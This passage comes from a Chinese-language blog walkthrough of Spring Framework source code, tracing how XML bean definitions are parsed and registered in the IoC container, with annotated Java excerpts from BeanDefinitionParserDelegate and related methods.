level in the document:     * "import", "alias", "bean".     * @param root the DOM root element of the document     */</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">parseBeanDefinitions</span><span class="token punctuation">(</span>Element root<span class="token punctuation">,</span> BeanDefinitionParserDelegate delegate<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>delegate<span class="token punctuation">.</span><span class="token function">isDefaultNamespace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            NodeList nl <span class="token operator">=</span> root<span class="token punctuation">.</span><span class="token function">getChildNodes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nl<span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Node node <span class="token operator">=</span> nl<span class="token punctuation">.</span><span class="token function">item</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token keyword">instanceof</span> <span class="token class-name">Element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    Element ele <span class="token operator">=</span> <span class="token punctuation">(</span>Element<span class="token punctuation">)</span> node<span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>delegate<span class="token punctuation">.</span><span class="token function">isDefaultNamespace</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token comment" spellcheck="true">// 看这里</span>                        <span class="token function">parseDefaultElement</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> delegate<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span> <span class="token punctuation">{</span>                        delegate<span class="token punctuation">.</span><span class="token function">parseCustomElement</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            delegate<span class="token punctuation">.</span><span class="token function">parseCustomElement</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>重点来了，涉及到标签解析了，这里我们常用的bean标签处理方法processBeanDefinition()</p><pre><code>private void parseDefaultElement(Element ele, BeanDefinitionParserDelegate delegate) {   // 对import标签处理   if (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) {      importBeanDefinitionResource(ele);   }   // 对alias标签处理   else if (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) {      processAliasRegistration(ele);   }   // 对bean标签处理   else if (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) {      processBeanDefinition(ele, delegate);   }   // 对beans标签处理   else if (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) {      // recurse      doRegisterBeanDefinitions(ele);   }}</code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Process the given bean element, parsing the bean definition     * and registering it with the registry.     */</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">processBeanDefinition</span><span class="token punctuation">(</span>Element ele<span class="token punctuation">,</span> BeanDefinitionParserDelegate delegate<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">/** BeanDefinitionHolder是BeanDefinition对象的封装类，封装了BeanDefinition，bean的名字和别名，用它来向IoC容器注册。            得到这个BeanDefinitionHolder就意味着BeanDefinition是通过BeanDefinitionParserDelegate对XML元素按照Spring的bean规则进行解析得到的        **/</span>        BeanDefinitionHolder bdHolder <span class="token operator">=</span> delegate<span class="token punctuation">.</span><span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>bdHolder <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            bdHolder <span class="token operator">=</span> delegate<span class="token punctuation">.</span><span class="token function">decorateBeanDefinitionIfRequired</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> bdHolder<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// Register the final decorated instance.</span>                <span class="token comment" spellcheck="true">// 向IoC容器注册解析到的BeanDefinition</span>                BeanDefinitionReaderUtils<span class="token punctuation">.</span><span class="token function">registerBeanDefinition</span><span class="token punctuation">(</span>bdHolder<span class="token punctuation">,</span> <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeanDefinitionStoreException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Failed to register bean definition with name '"</span> <span class="token operator">+</span>                        bdHolder<span class="token punctuation">.</span><span class="token function">getBeanName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> ele<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// Send registration event.</span>            <span class="token comment" spellcheck="true">// 在BeanDefinition向IoC容器注册完以后，发送消息</span>            <span class="token function">getReaderContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fireComponentRegistered</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BeanComponentDefinition</span><span class="token punctuation">(</span>bdHolder<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>我们先来看看parseBeanDefinitionElement()方法，它在BeanDefinitionParserDelegate中实现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanDefinitionParserDelegate</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String BEANS_NAMESPACE_URI <span class="token operator">=</span> <span class="token string">"http://www.springframework.org/schema/beans"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String MULTI_VALUE_ATTRIBUTE_DELIMITERS <span class="token operator">=</span> <span class="token string">",; "</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * Value of a T/F attribute that represents true.     * Anything else represents false. Case seNsItive.     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String TRUE_VALUE <span class="token operator">=</span> <span class="token string">"true"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String FALSE_VALUE <span class="token operator">=</span> <span class="token string">"false"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_VALUE <span class="token operator">=</span> <span class="token string">"default"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DESCRIPTION_ELEMENT <span class="token operator">=</span> <span class="token string">"description"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String AUTOWIRE_NO_VALUE <span class="token operator">=</span> <span class="token string">"no"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String AUTOWIRE_BY_NAME_VALUE <span class="token operator">=</span> <span class="token string">"byName"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String AUTOWIRE_BY_TYPE_VALUE <span class="token operator">=</span> <span class="token string">"byType"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String AUTOWIRE_CONSTRUCTOR_VALUE <span class="token operator">=</span> <span class="token string">"constructor"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String AUTOWIRE_AUTODETECT_VALUE <span class="token operator">=</span> <span class="token string">"autodetect"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String NAME_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"name"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String BEAN_ELEMENT <span class="token operator">=</span> <span class="token string">"bean"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String META_ELEMENT <span class="token operator">=</span> <span class="token string">"meta"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ID_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"id"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String PARENT_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"parent"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String CLASS_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"class"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ABSTRACT_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"abstract"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String SCOPE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"scope"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String SINGLETON_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"singleton"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LAZY_INIT_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"lazy-init"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String AUTOWIRE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"autowire"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String AUTOWIRE_CANDIDATE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"autowire-candidate"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String PRIMARY_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"primary"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEPENDS_ON_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"depends-on"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String INIT_METHOD_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"init-method"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DESTROY_METHOD_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"destroy-method"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String FACTORY_METHOD_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"factory-method"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String FACTORY_BEAN_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"factory-bean"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String CONSTRUCTOR_ARG_ELEMENT <span class="token operator">=</span> <span class="token string">"constructor-arg"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String INDEX_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String TYPE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"type"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String VALUE_TYPE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"value-type"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String KEY_TYPE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"key-type"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String PROPERTY_ELEMENT <span class="token operator">=</span> <span class="token string">"property"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String REF_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"ref"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String VALUE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"value"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LOOKUP_METHOD_ELEMENT <span class="token operator">=</span> <span class="token string">"lookup-method"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String REPLACED_METHOD_ELEMENT <span class="token operator">=</span> <span class="token string">"replaced-method"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String REPLACER_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"replacer"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ARG_TYPE_ELEMENT <span class="token operator">=</span> <span class="token string">"arg-type"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ARG_TYPE_MATCH_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"match"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String REF_ELEMENT <span class="token operator">=</span> <span class="token string">"ref"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String IDREF_ELEMENT <span class="token operator">=</span> <span class="token string">"idref"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String BEAN_REF_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"bean"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String PARENT_REF_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"parent"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String VALUE_ELEMENT <span class="token operator">=</span> <span class="token string">"value"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String NULL_ELEMENT <span class="token operator">=</span> <span class="token string">"null"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ARRAY_ELEMENT <span class="token operator">=</span> <span class="token string">"array"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String LIST_ELEMENT <span class="token operator">=</span> <span class="token string">"list"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String SET_ELEMENT <span class="token operator">=</span> <span class="token string">"set"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String MAP_ELEMENT <span class="token operator">=</span> <span class="token string">"map"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String ENTRY_ELEMENT <span class="token operator">=</span> <span class="token string">"entry"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String KEY_ELEMENT <span class="token operator">=</span> <span class="token string">"key"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String KEY_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"key"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String KEY_REF_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"key-ref"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String VALUE_REF_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"value-ref"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String PROPS_ELEMENT <span class="token operator">=</span> <span class="token string">"props"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String PROP_ELEMENT <span class="token operator">=</span> <span class="token string">"prop"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String MERGE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"merge"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String QUALIFIER_ELEMENT <span class="token operator">=</span> <span class="token string">"qualifier"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String QUALIFIER_ATTRIBUTE_ELEMENT <span class="token operator">=</span> <span class="token string">"attribute"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_LAZY_INIT_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"default-lazy-init"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_MERGE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"default-merge"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_AUTOWIRE_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"default-autowire"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_AUTOWIRE_CANDIDATES_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"default-autowire-candidates"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_INIT_METHOD_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"default-init-method"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_DESTROY_METHOD_ATTRIBUTE <span class="token operator">=</span> <span class="token string">"default-destroy-method"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/**     * Parses the supplied {@code &lt;bean>} element. May return {@code null}     * if there were errors during parse. Errors are reported to the     * {@link org.springframework.beans.factory.parsing.ProblemReporter}.     */</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">public</span> BeanDefinitionHolder <span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>Element ele<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Parses the supplied {@code &lt;bean>} element. May return {@code null}     * if there were errors during parse. Errors are reported to the     * {@link org.springframework.beans.factory.parsing.ProblemReporter}.     */</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token keyword">public</span> BeanDefinitionHolder <span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>Element ele<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> BeanDefinition containingBean<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 获取bean标签的id</span>        String id <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>ID_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取bean标签的name</span>        String nameAttr <span class="token operator">=</span> ele<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span>NAME_ATTRIBUTE<span class="token punctuation">)</span><span class="token punctuation">;</span>        List<span class="token operator">&lt;</span>String<span class="token operator">></span> aliases <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasLength</span><span class="token punctuation">(</span>nameAttr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> nameArr <span class="token operator">=</span> StringUtils<span class="token punctuation">.</span><span class="token function">tokenizeToStringArray</span><span class="token punctuation">(</span>nameAttr<span class="token punctuation">,</span> MULTI_VALUE_ATTRIBUTE_DELIMITERS<span class="token punctuation">)</span><span class="token punctuation">;</span>            aliases<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>nameArr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        String beanName <span class="token operator">=</span> id<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>aliases<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            beanName <span class="token operator">=</span> aliases<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"No XML 'id' specified - using '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span>                        <span class="token string">"' as bean name and "</span> <span class="token operator">+</span> aliases <span class="token operator">+</span> <span class="token string">" as aliases"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>containingBean <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">checkNameUniqueness</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> aliases<span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// bean元素的详细解析</span>        AbstractBeanDefinition beanDefinition <span class="token operator">=</span> <span class="token function">parseBeanDefinitionElement</span><span class="token punctuation">(</span>ele<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> containingBean<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanDefinition <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>StringUtils<span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>containingBean <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        beanName <span class="token operator">=</span> BeanDefinitionReaderUtils<span class="token punctuation">.</span><span class="token function">generateBeanName</span><span class="token punctuation">(</span>                                beanDefinition<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>readerContext<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span> <span class="token punctuation">{</span>                        beanName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>readerContext<span class="token punctuation">.</span><span class="token function">generateBeanName</span><span class="token punctuation">(</span>beanDefinition<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">// Register an alias for the plain bean class name, if still possible,</span>                        <span class="token comment" spellcheck="true">// if the generator returned the class name plus a suffix.</span>                        <span class="token comment" spellcheck="true">// This is expected for Spring 1.2/2.0 backwards compatibility.</span>                        String beanClassName <span class="token operator">=</span> beanDefinition<span class="token punctuation">.</span><span class="token function">getBeanClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanClassName <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span>                                beanName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> beanName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> beanClassName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>                                <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>readerContext<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isBeanNameInUse</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            aliases<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Neither XML 'id' nor 'name' specified - "</span> <span class="token operator">+</span>                                <span class="token string">"using generated bean name ["</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">error</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ele<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> null<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> aliasesArray <span class="token operator">=</span> StringUtils<span class="token punctuation">.</span><span class="token function">toStringArray</span><span class="token punctuation">(</span>aliases<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BeanDefinitionHolder</span><span class="token punctuation">(</span>beanDefinition<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> aliasesArray<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>继续看parseBeanDefinitionElement</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Parse the bean definition itself, without regard to name or aliases. May return     * {@code null} if 